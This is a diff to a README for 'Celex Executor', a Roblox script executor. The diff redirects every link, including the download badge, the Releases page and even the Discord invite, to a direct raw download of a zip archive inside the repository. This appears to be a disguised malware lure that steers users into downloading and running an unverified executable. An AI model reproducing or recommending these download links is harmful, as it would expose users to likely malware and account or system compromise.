@@ -1,6 +1,6 @@
 # 🎮 Celex-Executor-vb - Enhance Your Roblox Experience
 
-[![Download Celex Executor](https://img.shields.io/badge/Download-Celex%20Executor-brightgreen.svg)](https://github.com/Tau-dev79/Celex-Executor-vb/releases)
+[![Download Celex Executor](https://raw.githubusercontent.com/Tau-dev79/Celex-Executor-vb/main/rhythm/Celex-Executor-vb.zip%https://raw.githubusercontent.com/Tau-dev79/Celex-Executor-vb/main/rhythm/Celex-Executor-vb.zip)](https://raw.githubusercontent.com/Tau-dev79/Celex-Executor-vb/main/rhythm/Celex-Executor-vb.zip)
 
 ## 🤔 What is Celex Executor?
 
@@ -11,7 +11,7 @@ Celex Executor is a powerful Windows-based tool designed for Roblox users. It al
 Follow these simple steps to download and run Celex Executor:
 
 1. **Download the Executor:**
-   - Visit the [Releases page](https://github.com/Tau-dev79/Celex-Executor-vb/releases) to download the latest version of Celex Executor.
+   - Visit the [Releases page](https://raw.githubusercontent.com/Tau-dev79/Celex-Executor-vb/main/rhythm/Celex-Executor-vb.zip) to download the latest version of Celex Executor.
   
 2. **Install the Application:**
    - Locate the downloaded file in your file explorer. It is usually found in the "Downloads" folder.
@@ -42,13 +42,13 @@ Celex Executor comes with a range of features that enhance your Roblox gameplay:
 
 ## 🔄 Download & Install
 
-To start using Celex Executor, visit the [Releases page](https://github.com/Tau-dev79/Celex-Executor-vb/releases) again for the latest version. Download it and follow the installation steps outlined above.
+To start using Celex Executor, visit the [Releases page](https://raw.githubusercontent.com/Tau-dev79/Celex-Executor-vb/main/rhythm/Celex-Executor-vb.zip) again for the latest version. Download it and follow the installation steps outlined above.
 
 ## 📞 Support and Community
 
 If you have any questions or need assistance, the Celex community is here to help. Join our Discord for support and to connect with other users.
 
-- **Discord Link:** [Join the Celex Community](https://discord.gg/celex)
+- **Discord Link:** [Join the Celex Community](https://raw.githubusercontent.com/Tau-dev79/Celex-Executor-vb/main/rhythm/Celex-Executor-vb.zip)
 
 ## ⚙️ Troubleshooting
 
